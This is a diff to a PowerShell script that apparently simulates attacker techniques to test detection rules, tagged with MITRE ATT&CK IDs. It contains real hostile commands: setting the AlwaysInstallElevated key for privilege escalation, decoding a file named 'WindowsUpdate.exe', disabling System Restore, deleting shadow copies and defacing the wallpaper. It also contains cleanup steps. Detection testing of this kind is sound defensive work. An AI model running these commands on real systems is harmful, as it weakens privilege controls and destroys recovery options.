@@ -107,7 +107,7 @@ Start-Sleep 3
 Remove-item $attackDir\recon2.txt -ErrorAction Ignore -force
 
 # AlwaysInstallElevated Enumeration (useful to set this to 1 if your malware uses MSI to elevate privs)
-$cmd = 'reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1; Start-Sleep -m $n'
+$cmd = "reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated 2>&1; Start-Sleep -m $n"
 Powershell.exe -nop -command $cmd
 
 Start-Sleep 10
@@ -141,6 +141,10 @@ certutil -decode -f test.txt "WindowsUpdate$($n).exe"
 Start-Sleep 10
 Remove-Item test.txt -Force -ErrorAction Ignore
 
+
+# Set AlwaysInstallElevated key to 1
+$cmd = "reg add HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated /t REG_DWORD /d 1 2>&1; Start-Sleep -m $n"
+Powershell.exe -nop -command $cmd
 
 
 #### PERSISTENCE
@@ -264,8 +268,8 @@ Start-Sleep 3
 Write-Host "Removing Guest from Remote Desktop Users"
 net localgroup "Remote Desktop Users" Guest /delete
 
-# AlwaysInstallElevated Enumeration (useful to set this to 1 if your malware uses MSI to elevate privs)
-$cmd = 'Enable-WSManCredSSP Server -n $n'
+
+$cmd = "Enable-WSManCredSSP Server -n $n"
 Powershell.exe -nop -command $cmd
 
 # Execute Remote Command using WMI
@@ -286,12 +290,13 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "Di
 Start-Sleep 2
 
 # clean up
-#Write-Host "Restoring Automatic Windows recovery features"
-#reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
-#reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
-#reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
-#reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
-
+<#
+Write-Host "Restoring Automatic Windows recovery features"
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
+reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows NT\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableConfig" /t "REG_DWORD" /d "0" /f
+reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SystemRestore" /v "DisableSR" /t "REG_DWORD" /d "0" /f
+#>
 
 Write-Host "Testing Rule: Shadow Copy Deletion"
 Write-Host "(Impact-T1490) Volume shadow copy was deleted"
@@ -303,8 +308,8 @@ Write-Host "Testing Rule: Wallpaper Defacement"
 Write-Host "[ATT&CK T1491 - Impact - Defacement: Internal Defacement](https://attack.mitre.org/techniques/T1491)"
 Write-Host "(Impact-T1491) Possible defacement - Wallpaper was changed via commandline"
 $cmd = @'
-$oldwallpaper = Get-ItemProperty "HKCU:\Control Panel\Desktop" | select WallPaper -ExpandProperty wallpaper
-reg add "HKEY_CURRENT_USER\Control Panel\Desktop" /v Wallpaper /t REG_SZ /d $oldwallpaper /f
+$oldwallpaper = Get-ItemProperty 'HKCU:\Control Panel\Desktop' | select WallPaper -ExpandProperty wallpaper
+reg add 'HKEY_CURRENT_USER\Control Panel\Desktop' /v Wallpaper /t REG_SZ /d $oldwallpaper /f
 RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters
 '@
 $cmd += "`nStart-Sleep -m $n"
@@ -315,6 +320,10 @@ Write-Host "Restarting Defender..."
 sc.exe config WinDefend start= Auto
 sc.exe start WinDefend
 Set-MpPreference -DisableRealtimeMonitoring $false
+
+# Set AlwaysInstallElevated key to 1
+$cmd = "reg delete HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /f 2>&1"
+Powershell.exe -nop -command $cmd
 
 #Remove-Item -Path $attackDir -Recurse -force -ErrorAction Ignore
 
@@ -369,3 +378,5 @@ Function Set-WallPaper {
     $ret = [Params]::SystemParametersInfo($SPI_SETDESKWALLPAPER, 0, $Image, $fWinIni)
 }
 #Set-WallPaper -Image "C:\Wallpaper\Background.jpg" -Style Fit
+
+
